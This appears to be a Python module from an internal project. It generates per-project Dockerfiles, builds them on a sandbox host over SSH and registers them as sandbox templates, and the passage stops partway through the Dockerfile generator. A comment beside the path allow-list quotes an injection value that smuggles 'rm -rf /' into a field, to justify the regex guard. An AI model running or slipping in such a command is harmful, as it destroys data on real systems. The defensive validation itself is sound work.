"""项目沙箱镜像构建器（批2）—— EnvSpec → 项目专属沙箱镜像 → CubeSandbox 模板。

流程（docs/Project_Scoped_Sandbox_Design.md §七 批2）：
  EnvSpec → 生成 Dockerfile + warmup 清单
         → SSH 上沙箱机：传文件 → docker build → envd /health 自测 → create-from-image
         → 返回 template_id

沙箱机凭据存 secret_store（加密），不进 git/明文配置。
依赖 paramiko（纯 Python SSH）。deps_hash 做缓存：规格未变复用已有模板。
"""
from __future__ import annotations

import logging
import re
import shlex
from dataclasses import dataclass
from pathlib import Path
from typing import NamedTuple

from swarm.config import secret_store
from swarm.project.sandbox_spec import EnvSpec, Toolchain

logger = logging.getLogger("swarm.worker.image_builder")

# 沙箱机连接信息存 secret_store 的 key 名
SECRET_SSH_HOST = "sandbox_host_ssh_host"
SECRET_SSH_PORT = "sandbox_host_ssh_port"
SECRET_SSH_USER = "sandbox_host_ssh_user"
SECRET_SSH_PASSWORD = "sandbox_host_ssh_password"
SECRET_SSH_KEY = "sandbox_host_ssh_key"  # 私钥内容（可选，与密码二选一）

# base 镜像（机器实测 tag 为 latest）
BASE_IMAGE = "ghcr.io/tencentcloud/cubesandbox-base:latest"

# 各语言工具链的 apt/安装片段 + warmup 命令模板
_JDK_DEFAULT = "17"
_NODE_DEFAULT = "20"
# ★复核 H-3★ apt 的 gradle 在 Debian 稳定版是 4.x，跑不了 Java 17 ⇒ 必须钉发行版下载。
# 8.7 支持 Java 8~22（覆盖 _JDK_DEFAULT=17 与常见的 8/11/21）。
_GRADLE_DEFAULT = "8.7"

# ★复核 H-2★ gradle 是唯一没有依赖镜像的栈，而本仓实测构建机网络受限（go 分支注释：
# go.dev 被墙）。默认打 repo1.maven.org / plugins.gradle.org 大概率拉不动 → warmup 静默空转
# → 离线 classes 必失败 → L1 构建闸在离线沙箱假失败。与 maven 的 settings.xml 对称。
_GRADLE_INIT = """\
// Swarm 自动生成：gradle 依赖/插件镜像源（与 Maven settings.xml 同口径）。
// 构建机网络受限时 repo1.maven.org / plugins.gradle.org 常拉不动，故 aliyun 优先、官方兜底。
def swarmRepos = { org.gradle.api.artifacts.dsl.RepositoryHandler h ->
    h.maven { url 'https://maven.aliyun.com/repository/public' }
    h.maven { url 'https://maven.aliyun.com/repository/gradle-plugin' }
    h.mavenCentral()
    h.gradlePluginPortal()
}
settingsEvaluated { s ->
    s.pluginManagement { pm -> swarmRepos(pm.repositories) }
}
allprojects { p ->
    p.buildscript { bs -> swarmRepos(bs.repositories) }
    swarmRepos(p.repositories)
}
"""

# 安全：dep_source 子目录名白名单（S-5）——只允许常规相对路径字符；拒 `..` 逃逸、
# 拒绝对路径、拒一切 shell 元字符。仓库内容即攻击者可控，故是"允许什么"而非"禁止什么"。
# 结尾用 \Z 而非 $：$ 也匹配【行尾换行前】，`ok\nrm -rf /` 能过 $ 版正则，
# 而该值随后拼进沙箱 shell 命令（复核 MEDIUM）。
_SAFE_SUBDIR_RE = re.compile(r"^(?!/)(?!.*\.\.)[A-Za-z0-9._][A-Za-z0-9._/-]*\Z")


def template_exists_in_cubemaster(template_id: str) -> bool | None:
    """探活：模板是否真实存在于 CubeMaster 的模板 store。

    用途：预处理复用判据（preprocess._phase_build_sandbox）在复用 DB 记录的
    project.config["sandbox_template"] 之前先探活——CubeMaster 模板会因 TTL 过期/
    存储清理而消失（实测 task 82f12ce4：tpl-2ebae48 及全部基础模板被清，DB 仍留记录），
    若不探活直接复用悬空引用，worker 创建沙箱必报 130404 template_not_found。

    返回：True=存在；False=确认不存在（store 里没有此 id）；None=探活本身失败
    （网络/认证错误，无法判定）——None 时调用方应保守不复用（按需重建更安全）。
    """
    from swarm.config import get_config

    if not template_id:
        return False
    try:
        s = get_config().sandbox
        if not getattr(s, "api_url", ""):
            # 没配 CubeMaster 端点(api_url 空)→ 无从探活，返回 None(无法判定，调用方保守不复用)。
            logger.warning("template_exists_in_cubemaster(%s)：sandbox.api_url 未配置，无法探活", template_id)
            return None
        # B9（19号文）：收敛到单一模板查询封装——历史上此处用 Bearer、manager 用
        # X-API-KEY，服务端只认其一时本路径恒 401 → 恒判"不复用"→ 每次任务重烤
        # 20min 级专属镜像。封装内双头并发，两处行为一致。
        from swarm.worker.sandbox import query_cubemaster_templates

        items = query_cubemaster_templates(s, timeout=10.0)
        if items is None:
            logger.warning("template_exists_in_cubemaster(%s) 探活失败（无法判定）", template_id)
            return None
        return template_id in {t["id"] for t in items}
    except Exception as exc:  # noqa: BLE001
        logger.warning("template_exists_in_cubemaster(%s) 探活失败（无法判定）: %s", template_id, exc)
        return None


# 沙箱创建失败信息里【模板悬空/过期】的 ground-truth 标记。
# 背景（2026-07-06 实证）：CubeSandbox 升级后旧 v2 模板节点侧变 stale/needs-redo（130409），
# 但 CubeMaster /templates 列表级 status 仍报 "READY"（过时元数据）→ template_exists_in_cubemaster
# 只查注册表存在性会误判可用、preprocess 误复用不重建。唯一可靠信号是 worker 创建沙箱时的报错。
# 130404=template not found（被 TTL/清理回收）；130409=stale/needs-redo（升级后待重建）。
_TEMPLATE_STALE_MARKERS = (
    "130404",
    "130409",
    "template not found",
    "template_not_found",
    "not ready on any healthy node",
    "is stale",
    "needs redo",
    "needs to redo",
)


def error_indicates_stale_template(error_str: str) -> bool:
    """错误信息是否表明【项目专属模板悬空/过期，需重建】（130404 / 130409 / stale / needs redo）。"""
    if not error_str:
        return False
    low = str(error_str).lower()
    return any(m in low for m in _TEMPLATE_STALE_MARKERS)


def invalidate_project_template_on_stale(project_id: str | None, error_str: str) -> bool:
    """worker 撞【模板悬空/过期】错误时反向作废项目沙箱指纹，令下次 preprocess 自愈重建。

    治本背景：preprocess 复用判据 = `sandbox_template 存在 且 sandbox_deps_hash == 当前指纹`，
    存在性探活（template_exists_in_cubemaster）对 130409 stale 盲（列表 status 仍 READY）→ 误复用。
    这里在 ground-truth 失败点（worker create 报错）反向清 **sandbox_deps_hash**（仅指纹，
    不动 sandbox_template 指针）→ 下次 preprocess 指纹失配 → 走重建分支重烤新模板并回写。

    只清指纹不清指针的理由：本次已在飞的兄弟子任务仍读到旧 template 指针、沙箱选择行为不变
    （避免 mid-task 清指针致回退通用镜像的降级意外）；重建只发生在下一次 preprocess。

    返回：True=已作废指纹；False=非 stale 错误/无 project_id/无既有指纹（无操作，幂等）。
    """
    if not project_id or not error_indicates_stale_template(error_str):
        return False
    try:
        from swarm.project.store import get_project, update_project

        proj = get_project(project_id) or {}
        cfg = dict(proj.get("config") or {})
        if not cfg.get("sandbox_deps_hash"):
            return False  # 本就没指纹可作废（已被清或从未建过），幂等返回
        cfg["sandbox_deps_hash"] = ""  # 指纹失配 → 下次 preprocess 重建；保留 sandbox_template 指针
        update_project(project_id, config=cfg)
        logger.warning(
            "项目 %s 沙箱模板经 worker 创建报错坐实为悬空/过期（%s）→ 已作废复用指纹，"
            "下次预处理将重建专属模板（swarm preprocess run %s）",
            project_id, str(error_str)[:120], project_id,
        )
        return True
    except Exception as exc:  # noqa: BLE001 — 作废失败不阻断主失败路径
        logger.warning("invalidate_project_template_on_stale(%s) 失败（不阻断）: %s", project_id, exc)
        return False


@dataclass
class SSHConfig:
    host: str
    port: int
    user: str
    password: str | None = None
    pkey: str | None = None

    @classmethod
    def from_secret_store(cls) -> "SSHConfig | None":
        host = secret_store.get_secret(SECRET_SSH_HOST)
        user = secret_store.get_secret(SECRET_SSH_USER)
        if not host or not user:
            return None
        port = secret_store.get_secret(SECRET_SSH_PORT)
        return cls(
            host=host,
            port=int(port) if port and port.isdigit() else 22,
            user=user,
            password=secret_store.get_secret(SECRET_SSH_PASSWORD),
            pkey=secret_store.get_secret(SECRET_SSH_KEY),
        )


def save_ssh_config(host: str, user: str, password: str | None = None,
                    port: int = 22, pkey: str | None = None) -> None:
    """把沙箱机凭据写入 secret_store（加密）。"""
    secret_store.set_secret(SECRET_SSH_HOST, host)
    secret_store.set_secret(SECRET_SSH_USER, user)
    secret_store.set_secret(SECRET_SSH_PORT, str(port))
    if password:
        secret_store.set_secret(SECRET_SSH_PASSWORD, password)
    if pkey:
        secret_store.set_secret(SECRET_SSH_KEY, pkey)
    logger.info("沙箱机 SSH 凭据已写入 secret_store（加密）: host=%s user=%s", host, user)


# ──────────────────────────────────────────────
# SSH 执行器（paramiko）
# ──────────────────────────────────────────────
class SSHRunner:
    """沙箱机 SSH 执行器：跑命令、传文件。"""

    def __init__(self, cfg: SSHConfig):
        self.cfg = cfg
        self._client = None

    def __enter__(self):
        import io

        import os

        import paramiko
        self._client = paramiko.SSHClient()
        # DR-05-F8(#92) 整改：先加载已知主机公钥（known_hosts / 系统），使 pin 过的主机被识别。
        try:
            self._client.load_system_host_keys()
        except Exception:  # noqa: BLE001 — 无 known_hosts 不致命
            pass
        # 生产可经 SWARM_SSH_STRICT_HOST_KEY=1 启用 RejectPolicy（拒未知公钥，防 MITM 劫持构建机
        # 注入镜像/窃密码）；默认保守 AutoAdd（内网可信 + 避免缺 known_hosts 阻断既有构建，需运维
        # 预置 known_hosts 后再开严格模式）。开关值门控，不写死。
        _strict = os.environ.get("SWARM_SSH_STRICT_HOST_KEY", "0").strip().lower() in ("1", "true", "yes", "on")
        self._client.set_missing_host_key_policy(
            paramiko.RejectPolicy() if _strict else paramiko.AutoAddPolicy())
        kwargs = {"hostname": self.cfg.host, "port": self.cfg.port,
                  "username": self.cfg.user, "timeout": 15}
        if self.cfg.pkey:
            try:
                kwargs["pkey"] = paramiko.Ed25519Key.from_private_key(io.StringIO(self.cfg.pkey))
            except Exception:  # noqa: BLE001 — 私钥无效则退回密码
                if self.cfg.password:
                    kwargs["password"] = self.cfg.password
        elif self.cfg.password:
            kwargs["password"] = self.cfg.password
        self._client.connect(**kwargs)
        return self

    def __exit__(self, *exc):
        if self._client:
            self._client.close()

    def run(self, command: str, timeout: int = 1800) -> tuple[int, str, str]:
        """跑命令，返回 (exit_code, stdout, stderr)。"""
        assert self._client is not None
        _stdin, stdout, stderr = self._client.exec_command(command, timeout=timeout)
        out = stdout.read().decode("utf-8", "ignore")
        err = stderr.read().decode("utf-8", "ignore")
        code = stdout.channel.recv_exit_status()
        return code, out, err

    def put(self, local_path: str, remote_path: str) -> None:
        """上传单文件。"""
        assert self._client is not None
        sftp = self._client.open_sftp()
        try:
            self._mkdirs(sftp, str(Path(remote_path).parent))
            sftp.put(local_path, remote_path)
        finally:
            sftp.close()

    def put_text(self, content: str, remote_path: str) -> None:
        """把字符串写到远端文件。"""
        assert self._client is not None
        sftp = self._client.open_sftp()
        try:
            self._mkdirs(sftp, str(Path(remote_path).parent))
            with sftp.open(remote_path, "w") as f:
                f.write(content)
        finally:
            sftp.close()

    @staticmethod
    def _mkdirs(sftp, remote_dir: str) -> None:
        parts = remote_dir.strip("/").split("/")
        cur = ""
        for p in parts:
            cur += "/" + p
            try:
                sftp.stat(cur)
            except FileNotFoundError:
                sftp.mkdir(cur)


# ──────────────────────────────────────────────
# Dockerfile + warmup 生成（EnvSpec → 文本）
# ──────────────────────────────────────────────
class _StackEntry(NamedTuple):
    """一个 (name, build_tool) 组合的**全部**构建期事实。单一事实源。"""
    verify_cmd: str                    # 构建期【在场硬闸】：装完必须跑得通，失败＝镜像构建失败
    selftest: str | None               # 构建期离线自测命令（None=暂无，不阻断发布）


# ★27 号文 #8（apt_packages 半）★ 这一列原名 `apt_packages`，语义是"该组合必须在镜像里在场
# 的工具"，**唯一消费者是一条子串断言**（test_image_builder.py：`tool in effective`）。实测那条
# 断言在 6 个组合里有 2 个是**必然假过**、1 个是侥幸：
#   · go   声明 `/usr/local/go`，非注释行里唯一命中是 `ENV PATH="/usr/local/go/bin:…"`
#          ⇒ 把整条 `RUN curl … | tar -C /usr/local -xz` 安装删掉，断言照旧绿。
#   · gradle 声明 `gradle`，命中 6 行，5 行是顺带的（`/root/.gradle`、`/tmp/gradle.zip`、
#          `init.gradle`）⇒ 删掉真安装仍剩 5 行命中。
#   · rust 声明 `rustup`，唯一命中行**同时**含 URL `sh.rustup.rs` 和执行 `| sh -s -- -y`；
#          整行删才红（侥幸同行），只删执行、留 URL ⇒ 照旧绿。
# 病根是"声明在场"和"验证在场"用了两种**不同强度**的语言：声明是数据，验证只是让文本里出现
# 一个子串——而子串在 ENV/URL/路径里到处都是。gradle 分支早已给出正确形状：`RUN gradle -v`
# 是**构建期硬闸**（无 `|| true`），装不上当场构建失败，把"装没装上"从运行时 127 提前到构建期。
# 故本列改为 `verify_cmd` 并对 6 个组合一律接上该形状：声明本身就是可执行的验证，
# 不再需要（也不再可能有）一条替它背书的子串断言。全部命令都是本地 `-v/--version`，不联网。


# ★X-C2 复核 H-4 的治法★ 安装片段与自测命令原先是**两张各自手写的分派**：
# `_toolchain_install` 只看 `tc.name`（一律装 maven），`_selftest_command` 按 build_tool 分派
# （gradle → `./gradlew --offline classes`）⇒ 两处对同一份 spec 得出不同结论 ⇒ Gradle 工程镜像
# 里没有 gradle ⇒ 127 → BLOCKED 死循环。**病根是"同一件事有两张表"**，故合成一张：
# 两个函数都从这里取，物理上不可能再分叉。加新栈/新 build_tool 只能改这一处。
_STACK_REGISTRY: dict[tuple[str, str], _StackEntry] = {
    ("java", "maven"): _StackEntry(
        "mvn -v",
        "cd /workspace && mvn -o -B -q -Dmaven.test.skip=true compile"),
    ("java", "gradle"): _StackEntry(
        # ★复核 H-3★ 不用 apt 的 gradle：Debian 稳定版常年是 4.x，跑不了 Java 17
        # （`Unsupported class file major version` / `Could not determine java version`），
        # 属"装了但不可用"。照 go 分支的成例钉发行版下载（可复现、版本自主）。
        # `gradle -v` 同时验"在场"与"能跑起来"（4.x + Java 17 会在这里就炸，正是要的）。
        "gradle -v",
        # #37：`classes` 编译主源集全部 JVM 语言（Kotlin/Scala/Groovy/Java），是 compileJava
        # 的严格超集。wrapper 优先——但 wrapper **必须真能跑**，见 `_SRC_KEEP_JAR_SUFFIXES`。
        "cd /workspace && ((test -x ./gradlew && ./gradlew --offline --no-daemon classes -q) "
        "|| (gradle --offline --no-daemon classes -q))"),
    ("node", "npm"): _StackEntry(
        # npm 与 nodejs 同包但**分别**可执行；自测发的是 `npm`，故验 npm 而非 node。
        "node -v && npm -v",
        "cd /workspace && (npm run build --if-present || npm ci --offline || true)"),
    ("python", "pip"): _StackEntry(
        "python3 -V && python3 -m pip --version",
        "cd /workspace && python3 -m compileall -q ."),
    ("go", "go"): _StackEntry(
        # 原声明是路径 `/usr/local/go`（apt 包名意义上根本不存在），验的是**可执行**。
        "go version",
        "(command -v goimports >/dev/null 2>&1 && echo 'goimports: present' "
        "|| echo 'goimports: MISSING') && cd /workspace && go build ./... 2>&1 | head -40"),
    ("rust", "cargo"): _StackEntry(
        # 原声明 `rustup`，但下游自测/修复用的是 `cargo`；验真正被用的那个。
        "cargo --version && rustc --version",
        "(cargo fix --help >/dev/null 2>&1 && echo 'cargo fix: present' "
        "|| echo 'cargo fix: MISSING') && cd /workspace && cargo build --offline 2>&1 | head -40"),
}


def _has_build_tool(spec: EnvSpec, build_tool: str) -> bool:
    """spec 里是否有该 build_tool 的工具链。**归一口径的唯一实现**（复核 L-1）。

    原先 `has_maven` 用精确 `== "maven"`、新加的 gradle 门用 `(x or "").lower()`——同一个字段
    两种归一，正是本批在治的"判据不对称"。另：`build_tool` 缺失时 java 会同时装 maven+gradle
    （fail-safe），故那种 spec 对两个 build_tool 都算"有"，warmup/settings 才不会两头落空（L-2）。
    """
    want = build_tool.strip().lower()
    for t in spec.toolchains:
        bt = (t.build_tool or "").strip().lower()
        if bt == want:
            return True
        # java 且 build_tool 未定 → 安装片段装了 maven+gradle，两个 warmup 都该配上
        if not bt and (t.name or "").lower() == "java" and want in ("maven", "gradle"):
            return True
    return False


def stack_entry(name: str, build_tool: str | None) -> _StackEntry | None:
    """(name, build_tool) → 该组合的构建期事实。未收录返 None（调用方 fail-honest）。"""
    return _STACK_REGISTRY.get((str(name or "").lower(),
                                str(build_tool or "").strip().lower()))


def _verify_block(name: str, build_tool: str) -> str:
    """(name, build_tool) → 构建期在场硬闸的 Dockerfile 片段。未收录返 ""（fail-honest）。

    ★为什么注入点在 `_toolchain_install` 内部、而不是 `generate_dockerfile` 外面★
    java 的"装 maven 还是 gradle 还是都装"这个决策只在 `_toolchain_install` 里（`_want_maven`
    /`_want_gradle`，build_tool 缺失时**两个都装**）。放外面就得把同一个决策抄第二遍 ⇒
    正是本文件 X-C2 在治的"同一件事两张表"。故由持有决策的那一处顺手接上。
    """
    e = stack_entry(name, build_tool)
    if e is None or not e.verify_cmd:
        return ""
    # 无 `|| true`：这是硬闸。装不上就让镜像构建当场失败，而不是等运行时 127 → BLOCKED 死循环。
    return f"RUN {e.verify_cmd}\n"


def _toolchain_install(tc: Toolchain) -> str:
    """单工具链的 apt/安装 Dockerfile 片段。

    ★X-C2（27 号文 §3.2 CRITICAL）★ java 分支原先**只看 `tc.name`、完全不看 `tc.build_tool`**，
    一律只装 `maven`。而 `_selftest_command` 同一份 spec 上**是**按 build_tool 分派的
    （gradle → `./gradlew --offline classes || gradle --offline classes`）⇒ Gradle 工程的镜像里
    根本没有 gradle：无 wrapper 时自测 127、运行时任何 gradle 命令 127 → 与 X-C1 同型的
    BLOCKED 死循环（每轮重试撞同一个"命令不存在"，代码其实没问题）。
    ★判据不对称就是病根★：一处按 build_tool 分派、另一处不分派，两处必然分叉。
    """
    if tc.name == "java":
        ver = tc.version or _JDK_DEFAULT
        _bt = (tc.build_tool or "").strip().lower()
        # build_tool 缺失（探测不出）→ 保守两个都装：多装一个工具的代价远小于 127 死循环。
        _want_maven = _bt in ("maven", "")
        _want_gradle = _bt in ("gradle", "")
        _apt = "maven " if _want_maven else ""
        out = (
            f"RUN apt-get update && apt-get install -y --no-install-recommends "
            f"openjdk-{ver}-jdk {_apt}curl ca-certificates && rm -rf /var/lib/apt/lists/*\n"
            f"ENV JAVA_HOME=/usr/lib/jvm/java-{ver}-openjdk-amd64\n"
            f'ENV PATH="${{JAVA_HOME}}/bin:${{PATH}}"\n'
        )
        if _want_maven:
            # JAVA_HOME/PATH 已在上面写好 ⇒ `mvn -v` 此刻可跑（它要 JAVA_HOME）。
            out += _verify_block("java", "maven")
        if _want_gradle:
            # ★复核 H-3★ **不用 apt 的 gradle**：Debian 稳定版常年 4.x，在 Java 17 下跑不起来
            # （`Unsupported class file major version` / `Could not determine java version`）＝
            # "装了但不可用"，127 只是换成版本错，BLOCKED 照旧。照 go 分支的成例钉发行版下载。
            # ★复核 H-2★ 同时写 init.gradle 镜像源：gradle 是唯一没有依赖镜像的栈，而本仓实测
            # 构建机网络受限（go.dev 被墙），默认打 repo1.maven.org/plugins.gradle.org 大概率拉不动
            # → warmup 静默空转 → 离线 classes 必失败 → L1 构建闸在离线沙箱假失败。
            out += (
                f"ENV GRADLE_VERSION={_GRADLE_DEFAULT}\n"
                "ENV GRADLE_USER_HOME=/root/.gradle\n"
                "RUN curl -fsSL -o /tmp/gradle.zip "
                "https://mirrors.cloud.tencent.com/gradle/gradle-${GRADLE_VERSION}-bin.zip "
                "|| curl -fsSL -o /tmp/gradle.zip "
                "https://services.gradle.org/distributions/gradle-${GRADLE_VERSION}-bin.zip\n"
                "RUN apt-get update && apt-get install -y --no-install-recommends unzip "
                "&& unzip -q /tmp/gradle.zip -d /opt && rm -f /tmp/gradle.zip "
                "&& ln -sf /opt/gradle-${GRADLE_VERSION}/bin/gradle /usr/local/bin/gradle "
                "&& rm -rf /var/lib/apt/lists/*\n"
                "RUN mkdir -p /root/.gradle\n"
                "COPY warmup/init.gradle /root/.gradle/init.gradle\n"
            )
            # ★复核 MED-3★ 构建期**硬闸**：下载源双双失败/解包出半截文件时，前面那串
            # `curl … || curl …` 之后的 unzip 会拿着一个空文件继续，而镜像照样发布成功
            # ⇒ 运行时才 127，回到本批要治的死循环。失败即构建失败（无 `|| true`），
            # 把"装没装上"从运行时提前到构建期。
            # ★#8★ 这一行原是**字面**写在这里的 `RUN gradle -v`——即"正确形状只有 gradle 有"。
            # 现在改从 registry 取：6 个组合共用同一形状，加新栈时不写 verify_cmd 会被闸拦下。
            out += _verify_block("java", "gradle")
        return out
    if tc.name == "node":
        ver = tc.version or _NODE_DEFAULT
        return (
            f"RUN apt-get update && apt-get install -y --no-install-recommends curl ca-certificates "
            f"&& curl -fsSL https://deb.nodesource.com/setup_{ver}.x | bash - "
            f"&& apt-get install -y --no-install-recommends nodejs && rm -rf /var/lib/apt/lists/*\n"
            f"RUN npm config set registry https://registry.npmmirror.com\n"
            + _verify_block("node", "npm")
        )
    if tc.name == "python":
        return (
            "RUN apt-get update && apt-get install -y --no-install-recommends "
            "python3 python3-pip ca-certificates && rm -rf /var/lib/apt/lists/*\n"
            # X-M4 配套：构建机网络受限（go.dev/maven central 实测被墙，npm/maven/go 均已
            # 配国内镜像）——不配镜像的 pip warmup 是死信。`pip config` 老版本没有 →
            # || true，warmup 失败另有 echo 标记（降级可观测，不静默）。
            "RUN python3 -m pip config set global.index-url "
            "https://mirrors.aliyun.com/pypi/simple/ || true\n"
            + _verify_block("python", "pip")
        )
    if tc.name == "go":
        return (
            "ENV GO_VERSION=1.22.5\n"
            "ENV GOPATH=/root/go\n"
            "ENV GOPROXY=https://goproxy.cn,direct\n"
            # go.dev 在沙箱构建机网络被墙（实测 SSL_ERROR_SYSCALL）→ 用阿里云 Go 镜像（实测 200）
            "RUN apt-get update && apt-get install -y --no-install-recommends curl ca-certificates "
            "&& curl -fsSL https://mirrors.aliyun.com/golang/go${GO_VERSION}.linux-amd64.tar.gz | tar -C /usr/local -xz "
            "&& rm -rf /var/lib/apt/lists/*\n"
            'ENV PATH="/usr/local/go/bin:/root/go/bin:${PATH}"\n'
            # 确定性修复工具：goimports（Go 事实标准 import autofix，L1 _repair_go 用）。
            # GOBIN=/usr/local/bin 落在每个非登录 shell 的 PATH 上（sandbox.commands.run 不读 profile）。
            # 钉版本可复现；|| true 让构建期偶发拉取失败不阻断镜像（repair 缺工具会优雅跳过）。
            # ★#8★ 在场硬闸放在 goimports 之前：goimports 那行**刻意**带 `|| true`（缺它
            # repair 会优雅跳过，不该阻断镜像），而 go 本体缺失是死循环级故障，必须硬失败。
            # 这也是"复用单一事实源 ≠ 复用其消费契约"——同一条 RUN 序列上两种后果分档。
            + _verify_block("go", "go")
            + "RUN GOBIN=/usr/local/bin go install golang.org/x/tools/cmd/goimports@v0.24.0 || true\n"
        )
    if tc.name == "rust":
        return (
            "RUN apt-get update && apt-get install -y --no-install-recommends curl ca-certificates "
            "build-essential && curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh -s -- -y "
            "&& rm -rf /var/lib/apt/lists/*\n"
            'ENV PATH="/root/.cargo/bin:${PATH}"\n'
            # PATH 已含 /root/.cargo/bin ⇒ 此刻 cargo 可寻址（rustup 安装脚本静默失败时正是这里红）。
            + _verify_block("rust", "cargo")
        )
    # ★X-M7（27 号文 §3.2）★ 未知工具链治前只在 Dockerfile 里留一行注释——降级路径
    # 至少一次 WARNING（血规 3）：工具链没被识别 = 镜像里没有它的构建工具 = L1 构建闸
    # 在沙箱里整类 127/skip，注释没人看得到。
    logger.warning("[IMAGE-BUILD] X-M7 未知工具链 %r（build_tool=%r）：镜像不装它的构建"
                   "工具，L1 构建/测试闸在该栈上不可用——若这是真实栈，请给 "
                   "_STACK_REGISTRY/_toolchain_install 加表项", tc.name, tc.build_tool)
    return f"# (未知工具链 {tc.name}，跳过)\n"


# ★X-M4（27 号文 §3.2）★ go/rust/python 的 warmup 命令分派表（血规 1：栈行为走表，
# 加新栈只加表项）。预热目标：go→GOPATH/pkg/mod（GOPROXY 已在安装段配 goproxy.cn）、
# rust→/root/.cargo/registry（让 `--offline` 自测不再是死信）、python→系统 site-packages。
_SIMPLE_WARMUP_CMDS = {
    "go": "go mod download",
    "rust": "cargo fetch",
    # python 唯一可确定性预热的清单形态（血规 2：只为有权威命令的形态产命令）：
    # `pip install -r` 对 requirements.txt；pyproject/setup.py/Pipfile 由
    # _simple_warmup_command 返 None + 生成物留痕。--break-system-packages 在前：
    # Debian 12+ 的 PEP 668 拒系统级安装；老 pip 不认此旗标会报错 → 落到第二臂。
    "python": "python3 -m pip install --break-system-packages -r requirements.txt "
              "|| python3 -m pip install -r requirements.txt",
}


def _simple_warmup_command(tc: Toolchain) -> str | None:
    """go/rust/python 的 warmup 命令（X-M4 分派表消费点）。未收录/形态不符返 None。

    python 只在 dep_source 恰为 requirements.txt 时出命令（basename 判定，与
    `_is_pom_manifest_path` 同纪律：Pipfile/requirements-dev.txt 都不算）。
    """
    name = (tc.name or "").lower()
    if name == "python":
        dep = (tc.dep_source or "").replace("\\", "/").rsplit("/", 1)[-1]
        if dep != "requirements.txt":
            return None
    return _SIMPLE_WARMUP_CMDS.get(name)



def generate_dockerfile(spec: EnvSpec, *, src_included: bool = False) -> str:
    """EnvSpec → 项目专属 Dockerfile 文本。

    src_included=True 时，假定 build context 下有 project_src/ 目录（项目源码，
    已排除构建产物），COPY 进 /workspace，使沙箱自带完整项目 → mvn/npm 编译闭包完整。
    """
    lines = [
        f"# 项目专属沙箱 — project={spec.project_id} deps_hash={spec.deps_hash()}",
        "# 自动生成（project/sandbox_spec.py → worker/image_builder.py）。",
        f"FROM {BASE_IMAGE}",
        "ENV DEBIAN_FRONTEND=noninteractive",
        # git：所有项目沙箱都装。消除 worker agent 偶发 `git diff` 的 127 错误；
        # 构建期也可用 git 算源码指纹。注意：L1/产出 diff 仍走 difflib，git 仅环境兜底。
        "RUN (command -v git >/dev/null 2>&1) || "
        "(apt-get update && apt-get install -y --no-install-recommends git "
        "&& rm -rf /var/lib/apt/lists/*)",
    ]
    if spec.base_only:
        lines.append("# 全新空项目：仅基础镜像，等首个任务需求分析再补装工具链。")
        lines.append("RUN echo 'base-only sandbox'")
        return "\n".join(lines) + "\n"

    for tc in spec.toolchains:
        lines.append(f"# --- toolchain: {tc.name} ({tc.build_tool}) ---")
        lines.append(_toolchain_install(tc).rstrip())

    has_maven = _has_build_tool(spec, "maven")
    if has_maven:
        # settings.xml 配镜像源（aliyun）。warmup 真正发生在 COPY 源码之后（见下方），
        # 因为只有对【真实项目】跑一次 mvn compile，才能把编译生命周期插件
        # (maven-compiler-plugin/maven-resources-plugin 等) + 全部传递依赖拉进 .m2，
        # 固化进镜像层。精简 warmup pom 的 dependency:go-offline 只拉依赖 jar、不拉构建插件，
        # 导致沙箱运行时每次 mvn compile 仍在线下载几十个插件(实测 128 次 Downloading)。
        lines.append("COPY warmup/settings.xml /root/.m2/settings.xml")

    # ── 项目源码进镜像（方案 B 核心）：COPY 整个项目源码到 /workspace ──
    # 使沙箱自带完整项目，worker 运行时只覆盖被改的 scope 文件 → 编译闭包永远完整。
    # project_src/ 由构建器打包上传（已排除 .git/target/node_modules 等构建产物，见 §Q1）。
    if src_included:
        lines.append("# --- 项目源码（方案 B：沙箱自带完整项目，编译闭包完整）---")
        lines.append("COPY project_src/ /workspace/")
        # COPY 默认归 root:root；worker 经 envd 在沙箱内可能以非 root 用户跑 mvn/gradle，
        # 需要在 /workspace 写编译产物(target/、build/)。放开权限，避免
        # "could not create parent directories" / "Permission denied" 编译失败。
        lines.append("RUN chmod -R 0777 /workspace")
        # ── warmup：对真实项目跑一次 mvn compile（联网），把编译插件+全部依赖拉满 .m2 ──
        # 这是离线编译的关键：固化进镜像层后，沙箱运行时离线即可编译，不再每次下载。
        # 编译产物 target/ 清掉（保留 .m2 缓存即可），保持 /workspace 干净基线。
        if has_maven:
            lines.append("# warmup：真项目联网编译预热 .m2（含编译生命周期插件），固化进镜像层")
            # 直接 mvn compile（不用 dependency:go-offline——后者全量拉含 test 等用不到的依赖、
            # 对大项目慢到 20min+）。compile 按需拉真正需要的编译插件+依赖，够离线编译用。
            # -T 1C 按 CPU 核数并行编译多模块加速。
            lines.append("RUN cd /workspace && (mvn -B -T 1C -Dmaven.test.skip=true compile 2>&1 | tail -5 || true) "
                         "&& find . -type d -name target -exec rm -rf {} + 2>/dev/null || true")
            # 离线编译自检（软诊断，不阻断；真正发布闸门是 envd /health）
            lines.append("RUN cd /workspace && (mvn -o -B -q -Dmaven.test.skip=true compile 2>&1 | tail -3 "
                         "&& echo '✅ warmup 离线编译通过：.m2 已填满构建插件+依赖' "
                         "|| echo '⚠️ warmup 离线编译仍有缺漏：运行时联网兜底') "
                         "&& find . -type d -name target -exec rm -rf {} + 2>/dev/null || true")

        # ── Gradle warmup（X-C2 配套）──
        # 缺它的话：镜像里即便装了 gradle，依赖与插件仍未落盘 ⇒ `_selftest_command` 的
        # `--offline classes` 必失败（自测软诊断不阻断发布，但沙箱运行时**每次**都要联网拉依赖，
        # 而 L1 构建闸在离线/弱网沙箱里就会假失败）。与 maven 填 .m2、npm 填 node_modules 同理：
        # 联网跑一次真编译，把 ~/.gradle 缓存固化进镜像层。
        if _has_build_tool(spec, "gradle"):
            lines.append("# warmup：真项目联网编译预热 ~/.gradle（含插件+依赖），固化进镜像层")
            # wrapper 优先（工程钉的 gradle 版本才是权威）；无 wrapper 用系统 gradle。
            # `classes` 编译主源集全部 JVM 语言（与 _selftest_command 同口径，见 #37）。
            # --no-daemon：守护进程会在镜像层里留下无用状态且拖慢构建。
            # ★复核 H-1★ 绝不在判成败的那一臂后面接管道：`cmd 2>&1 | tail -5` 的退出码是
            # **tail 的**（恒 0）⇒ `|| (系统 gradle)` 兜底臂成为**死代码**。而 wrapper 那一臂
            # 恰恰是"恒失败"的（C-2：tarball 剥掉 wrapper jar 前 `./gradlew` 必崩），于是
            # warmup 每次都"看起来成功"、`~/.gradle` 全空、且因 `|| true` 完全静默。
            # 治法：把输出重定向到文件、用 `tail` 单独打印，判成败只看命令本身的退出码。
            _log = "/tmp/gradle-warmup.log"
